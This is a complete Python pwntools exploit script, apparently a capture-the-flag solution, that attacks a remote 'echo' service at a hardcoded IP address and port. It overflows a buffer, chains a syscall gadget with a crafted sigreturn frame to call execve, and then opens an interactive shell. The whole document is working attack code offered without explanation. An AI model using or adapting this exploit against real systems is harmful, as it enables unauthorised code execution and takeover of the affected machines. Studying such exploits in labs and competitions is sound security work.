#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()
    r = remote("161.97.176.150", 9090)
    
    pause()
    ret = 0x0000000000401034
    leak_gadget = 0x000000000040100b
    echo = 0x0000000000401000
    syscall = 0x0000000000401022

    frame = SigreturnFrame()
    frame.rip = syscall
    frame.rdi = 0x401035
    frame.rax = 0x3b
    frame.rsi = 0
    frame.rdx = 0
 

    payload = p8(0x4d)*(0x188)
    payload += p64(echo)
    payload += p64(syscall)
    payload += bytes(frame)

    r.send(payload)
    pause()
    r.send("M"*15) # set rax to sigreturn
    

    r.interactive()


if __name__ == "__main__":
    main()
